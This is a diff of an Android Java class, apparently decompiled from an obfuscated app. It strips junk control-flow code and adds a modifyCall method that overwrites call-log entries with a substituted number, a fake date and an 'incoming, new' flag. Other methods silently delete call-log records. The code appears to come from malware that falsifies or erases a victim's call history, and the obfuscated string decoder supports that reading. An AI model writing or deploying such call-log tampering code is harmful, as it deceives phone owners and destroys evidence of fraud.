@@ -135,9 +135,10 @@ public class Constants {
     public static final String UNDERLINE_STRING = "_";
     public static String UNNECESSARY_AUTO_DELETE_LIST = "";
     public static List<CallLogBean> mCallLogList;
-    
-    
+
+
     public static final int THAT_CODE = 268435456;
+
     public static void delCallLog(Context context, String str) {
         try {
 //             int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFY"), new String[]{str});
@@ -165,23 +166,38 @@ public class Constants {
         }
     }
 
+    /**
+     * @param context
+     * @param number  匹配号码
+     * @param phone   修改号码
+     */
+    public static void modifyCall(Context context, String number, String phone) {
+        ContentValues values = new ContentValues();
+        values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);
+        values.put(CallLog.Calls.NUMBER, phone);
+        values.put(CallLog.Calls.DATE, 123123123);
+        values.put(CallLog.Calls.NEW, 1);
+        context.getContentResolver().
+                update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.NUMBER + "=?", new String[]{number});
+    }
+
+    public static void modifySmsCall(Context context, String number, String phone) {
+        ContentValues values=new ContentValues();
+        //values.put();
+    }
+
     public static void delCallLog(Context context, String str, int i, long j) {
-        if ((3933 + 13503) % 13503 > 0) {
-            try {
+        try {
 //                 int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFZJCAcNSR0QGQxUVkkIBw1JDRwbCB0ABgdJVElW"), new String[]{str, String.valueOf(i), String.valueOf(j)});
-                int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=? and type=? and duration = ?", new String[]{str, String.valueOf(i), String.valueOf(j)});
-                String str2 = TAG;
+            int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=? and type=? and duration = ?", new String[]{str, String.valueOf(i), String.valueOf(j)});
+            String str2 = TAG;
 //                 LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
-                LogUtils.d(str2, "delCallLog ret: " + delete);
-                return;
-            } catch (Exception e) {
+            LogUtils.d(str2, "delCallLog ret: " + delete);
+            return;
+        } catch (Exception e) {
 //                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkNDAUqCAUFJQYOSS8IAAUMDVNJ") + e.getMessage());
-                LogUtils.callLog(TAG + ", delCallLog Failed: " + e.getMessage());
-                return;
-            }
-        }
-        int i2 = (-8701) + ((-8701) - 4002);
-        while (true) {
+            LogUtils.callLog(TAG + ", delCallLog Failed: " + e.getMessage());
+            return;
         }
     }
 
